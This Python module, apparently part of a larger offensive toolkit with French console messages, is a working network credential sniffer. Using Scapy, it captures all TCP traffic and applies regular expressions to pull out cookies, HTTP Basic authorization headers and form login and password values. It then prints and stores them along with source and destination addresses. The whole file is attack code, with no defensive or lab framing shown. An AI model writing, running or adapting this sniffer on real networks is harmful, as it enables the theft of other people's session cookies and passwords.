from scapy.all import sniff, TCP, Raw
from datetime import datetime
from rich.console import Console
import re
from core.storage import results

console = Console()
running = True

def stop_sniffing():
    global running
    running = False

def extract_credentials(payload):
    try:
        text = payload.decode(errors="ignore")
        creds = []

        # Cookie
        cookies = re.findall(r"(?i)Cookie: (.+)", text)
        for c in cookies:
            creds.append(("Cookie", c.strip()))

        # HTTP Basic Auth
        auth = re.findall(r"(?i)Authorization: Basic (.+)", text)
        for a in auth:
            creds.append(("Auth", a.strip()))

        # Login/Password (formulaire)
        form_login = re.findall(r"(login|user|email)=([^&\s]+)&?(password|pass|pwd)=([^&\s]+)", text, re.IGNORECASE)
        for l in form_login:
            login_field = f"{l[0]}={l[1]}"
            pass_field = f"{l[2]}={l[3]}"
            creds.append(("Login", l[1]))
            creds.append(("Password", l[3]))

        # Si trouvé une seule string type login=test&password=test
        single_line = re.findall(r"\b(login|user|email)=(\w+).*?(password|pass|pwd)=(\w+)", text, re.IGNORECASE)
        for s in single_line:
            creds.append(("Login", s[1]))
            creds.append(("Password", s[3]))

        return creds
    except Exception:
        return []

def process_packet(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        src = pkt[0][1].src
        dst = pkt[0][1].dst
        payload = pkt[Raw].load
        time_str = datetime.now().strftime("%H:%M:%S")

        creds = extract_credentials(payload)
        if creds:
            console.print(f"[blue][{time_str}][/blue] [bold]{src} → {dst}[/bold] [green]TCP[/green]")
            for typ, val in creds:
                console.print(f"   [orange1]> {typ}:[/orange1] {val}")
                results["sniff"].append({"time": time_str, "src": src, "dst": dst, "type": typ, "value": val})

def start_sniffing():
    global running
    running = True
    console.print("\n[cyan][*] Démarrage du sniffing réseau…  Appuyez sur CTRL+C pour arrêter.[/cyan]\n")
    try:
        # ❌ Ma tdirch filter="tcp port 80"
        sniff(prn=process_packet, store=False, stop_filter=lambda x: not running)
    except KeyboardInterrupt:
        console.print("\n[red][!] Sniffing stoppé par l'utilisateur.[/red]")
        results["sniff"].append("Sniffing terminé.")
